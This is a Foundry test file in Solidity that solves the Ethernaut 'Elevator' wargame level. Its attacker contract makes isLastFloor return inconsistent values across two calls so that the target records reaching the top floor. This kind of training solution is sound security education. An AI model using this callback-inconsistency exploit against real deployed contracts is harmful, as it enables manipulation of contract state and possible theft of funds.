// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Elevator, Building} from "../src/levels/Elevator.sol";

/// Ethernaut #11 "Elevator" → SC02 logic / untrusted-interface assumption (no exact catalog entry).
/// Elevator trusts `msg.sender`'s `isLastFloor` to be a pure function, but the attacker implements it
/// to return `false` then `true`. Win: `top == true`.
contract ElevatorAttacker is Building {
    bool toggled;

    function isLastFloor(uint256) external override returns (bool) {
        bool r = toggled; // false on the 1st call, true on the 2nd
        toggled = !toggled;
        return r;
    }

    function attack(Elevator e) external {
        e.goTo(1);
    }
}

contract ElevatorTest is Test {
    function test_solve_elevator() public {
        Elevator lvl = new Elevator();
        ElevatorAttacker a = new ElevatorAttacker();
        a.attack(lvl);
        assertTrue(lvl.top(), "reached the top via an inconsistent isLastFloor");
    }
}
